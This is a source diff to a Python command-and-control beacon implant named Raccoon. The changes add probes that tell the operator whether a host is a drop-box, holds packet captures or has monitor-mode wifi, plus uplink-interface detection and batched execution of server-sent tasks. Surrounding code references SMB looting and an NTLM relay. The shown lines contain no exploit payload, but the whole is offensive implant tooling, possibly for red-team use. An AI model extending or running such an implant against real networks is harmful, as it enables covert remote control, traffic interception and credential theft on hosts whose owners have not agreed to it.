@@ -35,6 +35,10 @@ from typing import Optional
 
 logger = logging.getLogger("raccoon.c2")
 
+_SYSFS_NET = "/sys/class/net"
+_PROC_NET_ROUTE = "/proc/net/route"
+_MONITOR_DRIVERS = ("88XXau", "rtl8812au", "8812au")
+
 
 # ── Stdlib AES-256-GCM via OpenSSL ctypes ──
 
@@ -1335,6 +1339,13 @@ class Beacon:
         self._registered = False
         self._consecutive_failures = 0
 
+        # A launcher that runs on the drop-box says so; the Raccoon config on
+        # disk is the independent second signal (see _probe_dropbox).
+        self._dropbox_hint = bool(c2.get("dropbox", False))
+        # Read once: check-ins must not walk sysfs and the routing table.
+        self._caps = self._detect_caps()
+        self._uplink_iface = self._detect_uplink_iface()
+
     # ── Identity ──
 
     def _generate_id(self) -> str:
@@ -1434,6 +1445,131 @@ class Beacon:
                     continue
         return None
 
+    # ── Capabilities ──
+
+    def _detect_caps(self) -> list:
+        """Capabilities advertised to the C2. Never raises: a beacon with an
+        incomplete list is better than one that cannot start."""
+        caps = ["batch", "smbloot",
+                "windows" if platform.system() == "Windows" else "posix"]
+        for probe in (self._probe_dropbox, self._probe_sniffer,
+                      self._probe_wifi):
+            try:
+                caps.extend(probe())
+            except Exception as e:
+                logger.debug("Capability probe %s failed: %s", probe.__name__, e)
+        return caps
+
+    @staticmethod
+    def _raccoon_config_paths() -> list:
+        from software.c2.beacon_standalone import CONFIG_PATHS
+        return list(CONFIG_PATHS)
+
+    def _probe_dropbox(self) -> list:
+        # The launcher's word counts even if the config lookup below fails.
+        if self._dropbox_hint:
+            return ["dropbox"]
+        # A Raccoon config on disk is what makes a host a drop-box.
+        if any(Path(p).exists() for p in self._raccoon_config_paths()):
+            return ["dropbox"]
+        return []
+
+    def _configured_capture_dir(self) -> Optional[str]:
+        import yaml
+        for p in self._raccoon_config_paths():
+            if Path(p).exists():
+                with open(p) as f:
+                    cfg = yaml.safe_load(f) or {}
+                return (cfg.get("sniffer") or {}).get("capture_dir") or None
+        return None
+
+    def _probe_sniffer(self) -> list:
+        capture_dir = getattr(self, "capture_dir", None)
+        if not capture_dir:
+            capture_dir = self._configured_capture_dir()
+        if not capture_dir or not Path(capture_dir).is_dir():
+            return []
+        # The sniffer writes into one subdirectory per capture profile, and
+        # may leave only encrypted (.pcap.gpg) files behind.
+        if next(Path(capture_dir).rglob("*.pcap*"), None) is not None:
+            return ["sniffer"]
+        return []
+
+    def _probe_wifi(self) -> list:
+        caps = []
+        for name in sorted(os.listdir(_SYSFS_NET)):
+            iface = os.path.join(_SYSFS_NET, name)
+            if not os.path.exists(os.path.join(iface, "wireless")):
+                continue
+            if "wifi:scan" not in caps:
+                caps.append("wifi:scan")
+            driver = os.path.join(iface, "device", "driver")
+            if (os.path.exists(driver)
+                    and os.path.basename(os.path.realpath(driver))
+                    in _MONITOR_DRIVERS):
+                caps.append("wifi:monitor")
+                break
+        return caps
+
+    def _detect_uplink_iface(self) -> Optional[str]:
+        """Interface carrying the default route, or None when unsure.
+
+        None makes the safety layer refuse every monitor-mode switch, which
+        is safe; a wrong answer could let it cut its own channel. So an
+        ambiguous table is reported as None rather than guessed at.
+        """
+        try:
+            if platform.system() == "Windows":
+                return self._uplink_from_route_print()
+            return self._uplink_from_proc_route()
+        except Exception as e:
+            logger.debug("Uplink detection failed: %s", e)
+            return None
+
+    @staticmethod
+    def _lowest_metric_iface(candidates: list) -> Optional[str]:
+        if not candidates:
+            return None
+        best = min(m for m, _ in candidates)
+        ifaces = {i for m, i in candidates if m == best}
+        return ifaces.pop() if len(ifaces) == 1 else None
+
+    def _uplink_from_proc_route(self) -> Optional[str]:
+        candidates = []
+        with open(_PROC_NET_ROUTE) as f:
+            next(f, None)
+            for line in f:
+                cols = line.split()
+                if len(cols) < 8:
+                    continue
+                iface, dest, flags, metric, mask = (
+                    cols[0], cols[1], cols[3], cols[6], cols[7])
+                if dest != "00000000" or mask != "00000000":
+                    continue
+                try:
+                    flags_v, metric_v = int(flags, 16), int(metric)
+                except ValueError:
+                    continue
+                # RTF_UP set, RTF_REJECT clear
+                if not flags_v & 0x1 or flags_v & 0x200:
+                    continue
+                candidates.append((metric_v, iface))
+        return self._lowest_metric_iface(candidates)
+
+    def _uplink_from_route_print(self) -> Optional[str]:
+        # Windows reports the interface by address, not by name, and the
+        # router compares this value against interface *names*. An address
+        # would therefore never match, so the safety layer would believe the
+        # uplink is known and allow a monitor-mode switch on it — the exact
+        # failure "no uplink known" exists to prevent, since that case
+        # refuses every switch instead.
+        #
+        # So: nothing is reported here. Correlating the address back to a
+        # name needs a second command, on a platform where the monitor-mode
+        # path does not exist at all, so the conservative answer costs
+        # nothing and the permissive one costs the channel.
+        return None
+
     # ── System info ──
 
     def _system_info(self) -> dict:
@@ -1449,6 +1585,8 @@ class Beacon:
             "interval": self.interval,
             "local_ips": self._get_local_ips(),
             "proxy_mode": self.proxy_mode,
+            "caps": list(self._caps),
+            "uplink_iface": self._uplink_iface,
         }
         if self._ntlm_relay:
             # Report the real upstream, not the local relay port — the operator
@@ -3797,6 +3935,29 @@ class Beacon:
 
     # ── Task dispatcher ──
 
+    def _process_tasking_batch(self, tasking: dict):
+        """Run a {"tasks": [...]} batch in order, or a lone task dict from an
+        older server once."""
+        if not tasking:
+            return
+        if "tasks" not in tasking:
+            self._process_tasking(tasking)
+            return
+        tasks = tasking["tasks"]
+        if not isinstance(tasks, list):
+            logger.warning("Ignoring malformed task batch: %s", type(tasks).__name__)
+            return
+        for task in tasks:
+            if not isinstance(task, dict):
+                continue
+            try:
+                self._process_tasking(task)
+            except Exception as e:
+                logger.warning("Task %s failed: %s", task.get("id", "?"), e)
+            # kill clears _running; the rest of the batch must not follow it.
+            if not self._running:
+                break
+
     def _process_tasking(self, tasking: dict):
         if not tasking:
             return
@@ -4022,7 +4183,7 @@ class Beacon:
             elif tasking:
                 self._consecutive_failures = 0
                 logger.debug("Tasking: %s", tasking.get("cmd", "?"))
-                self._process_tasking(tasking)
+                self._process_tasking_batch(tasking)
             else:
                 self._consecutive_failures = 0
 
